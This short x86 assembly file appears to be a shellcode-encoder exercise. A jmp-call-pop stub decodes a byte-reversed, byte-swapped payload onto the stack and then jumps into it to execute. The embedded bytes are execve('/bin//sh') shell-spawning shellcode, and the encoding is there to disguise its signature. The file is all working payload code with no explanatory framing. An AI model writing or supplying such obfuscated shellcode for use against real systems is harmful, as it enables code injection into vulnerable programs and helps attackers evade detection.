section .text

global _start

_start:
    jmp short encoded_code                  ; start jmp-call-pop

decoder:
    pop esi                                 ; save memory address of our reversed code
    xor ecx, ecx		                    ; zero out ecx
    mov cl, length/4		                ; iterate for every dword - in our case it will be 7 times

decode:
    mov eax, dword [esi]                    ; move into eax the dword pointed by esi
    bswap eax			                    ; use bswap for little endian format
    push eax			                    ; place it on stack
    add esi,4 			                    ; move to next dword
    loop decode			                    ; iterate through the entire length
    jmp esp			                        ; esp is pointing to decoded code

encoded_code:
    call decoder
    shellcode: db    0x90,0x90,0x90,0x80,0xcd,0x0b,0xb0,0xe1,0x89,0x53,0xe2,0x89,0x50,0xe3,0x89,0x6e,0x69,0x62,0x2f,0x68,0x68,0x73,0x2f,0x2f,0x68,0x50,0xc0,0x31
    length equ $-shellcode 
